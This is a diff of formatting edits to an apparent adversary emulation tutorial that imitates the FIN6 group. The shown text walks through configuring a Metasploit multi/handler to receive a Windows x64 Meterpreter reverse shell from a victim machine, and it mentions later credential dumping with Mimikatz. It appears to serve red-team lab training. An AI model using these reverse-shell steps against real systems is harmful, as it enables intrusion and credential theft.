@@ -58,9 +58,9 @@ Take note that in order to dump credentials with Mimikatz later on the victim's 
 
 ### 1.4 - Generate Payload Handler
 
-With our Windows X64 executable payload is now created, we need a handler to accept the connection back from our target. We will use the `exploit/multi/handler` metasploit module.
+With our Windows X64 executable payload is now created, we need a handler to accept the connection back from our target. We will use the <kbd>exploit/multi/handler</kbd> metasploit module.
 
-Normally, you can use exploit/multi/handler this way:
+Normally, you can use <kbd>exploit/multi/handler</kbd> this way:
 
 ```bash
 msf6 > use exploit/multi/handler
@@ -76,7 +76,7 @@ msf6 exploit(multi/handler) > show options
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Show_Options.png){:width="100%"}
 
-As youn can see, the payload is currently set to default `generic/shell_reverse_tcp`. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated:
+As youn can see, the payload is currently set to default <kbd>generic/shell_reverse_tcp</kbd>. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated:
 
 ```bash
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
